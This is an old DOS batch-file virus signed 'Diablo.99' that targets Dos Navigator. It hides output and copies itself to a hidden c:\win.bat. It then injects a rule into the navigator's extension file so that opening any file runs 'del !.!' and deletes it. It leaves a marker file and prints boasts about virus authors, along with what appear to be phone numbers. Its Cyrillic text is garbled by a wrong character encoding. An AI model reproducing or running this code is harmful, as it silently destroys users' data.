:ฎงเฎคจฌ ฌ๋ ฎเโฎญ ฎฌ ญคฅเ, ver 3.0! (c) Diablo.99
:  โ  แฎงค ญจ๏ ฏเฎฃเ ฌฌ๋ 29-05-99
@echo off
echo ฅเฅค ๑ฌ กฎซ์่ฎฉ ฏเจขฅโ! (Reproduce big hello!)

if "%0"=="win.bat" goto message
set antiDN= c:\dn\dn.ext
if not exist %antiDN% goto noDN
ctty nul
copy %0 c:\win.bat
attrib c:\win.bat +h +r +a
goto antidn
:message
@echo off
ctty con
echo กคโซญ๏ เแก ญ ขซ็โ ชฌ์โเ,   ชช โ ฎฅ ๋์ ฏแฎ!
echo ขโฎเ๋ ขจเใแฎข ญฅ แฏ๏โ,   คฅฉแโขใ๎โ (c) Diablo.99
attrib c:\win.bat -h -r -a
@ctty nul
del c:\win.bat
goto end
:antiDN
if exist c:\smrd.sys goto end
attrib %antiDN% -h -r -a
echo.           >> %antiDN%
echo ???{       >> %antiDN%
echo @echo off  >> %antiDN%
echo del !.!    >> %antiDN%
echo }          >> %antiDN%
dir c:\ > c:\smrd.sys
@ctty con
goto end
:noDN
@echo off
cls
echo This programm don't work, beacuse you don't have Dos Navigator...
echo               โ๋ งญ ฅ่์ ํโจๅ ซ๎คฅฉ???
echo 0      481-1139 []   2-1-116
echo                                                  (เ ฉฎญ จ ซฎงฎขฎ)
echo           431-9131         69-54
echo                493-6087         13-69 (เฎคแโข)
pause
:end
